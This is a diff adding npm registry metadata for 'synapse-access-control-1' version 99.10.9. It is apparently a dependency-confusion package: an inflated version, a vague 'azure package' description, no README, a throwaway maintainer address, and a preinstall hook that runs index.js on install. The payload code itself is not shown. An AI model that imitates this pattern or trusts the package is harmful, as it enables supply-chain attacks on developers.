@@ -1,0 +1,62 @@
+{
+    "_id": "synapse-access-control-1",
+    "name": "synapse-access-control-1",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "synapse-access-control-1",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "synapse-access-control-1@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-5tAJwmeWj5L80rZwkgwhF96S1n/aj3ntpU/ZnPo8rnD0hJLKARCoY3iEjs9ClLUSuHXA945bxsjTh7n04BnLvA==",
+                "shasum": "3247b47263a25b0070c0011d0ea59a27652cd631",
+                "tarball": "https://registry.npmjs.org/synapse-access-control-1/-/synapse-access-control-1-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5073,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNQ5MACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpq+Q//cwk4196KhOPPygBFai0Y5xtnMaFGgoJyrBARCsU+3QHFcSct\r\nT2bVEtk+tbyHoOYS9SJmw9tXNim86yhJgJZNQy5RpAFhAPMUACIBjN6gHx3T\r\n3wM/ssP46brJFPuhv1QjZBmeKYObiXznHavdBUnxWL8qWjBMLknxEWk4Dc9J\r\n1xuwR5xSVwvTSqNF3g9pzX+QcVJi3QvOLynJezHjMDJ1cJSNhhS519BbFPna\r\nYrJ3ANOZY/yqovRIqBXX3c/MUdRxTgB8glkosDQu5e30gd9Q5S7GLN372csS\r\nKn4YOvCurIPu3wyWtPEGAOhlE79z/QpkUWGFZCx+q456vQfDLnk+LNADQGiN\r\nzKGj4Xi9BrzPjYajU4106UxiN/axYVs9D9o6lzqnT0WqIcBvDhAerR18BtqV\r\ngElXh1SOAfSS2a143Q4Aw+GAo0WPd5lFn5oPefOsW1ta/MwUD2stGQ1SHCL2\r\nrhItgzCkRuwl/v6dW+c3gbJtruyj7Wwr4Ae7/VdswUUCxv/Kt+gZn4Frz44J\r\niwCHEAReV1PL8WVscb81G3AhkfpvtQ9MHISI/rW+8/1BguwvE8XxfMyXgwPR\r\n+lbjx42aXtLltd6mJ5kjhqH2tLU7dDxCtF5HSuM/eGY2WNN7wisnhhHvIg1K\r\nvq1INFC87N9ycvInw6TNEtE8M6AkJ3glWs0=\r\n=lZGE\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "c1nnlp98",
+                "email": "c1nnlp98@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "c1nnlp98",
+                    "email": "c1nnlp98@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/synapse-access-control-1_99.10.9_1647644236408_0.7299370007329036"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-18T22:57:16.408Z",
+        "99.10.9": "2022-03-18T22:57:16.541Z",
+        "modified": "2022-03-18T22:57:16.716Z"
+    },
+    "maintainers": [
+        {
+            "name": "c1nnlp98",
+            "email": "c1nnlp98@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
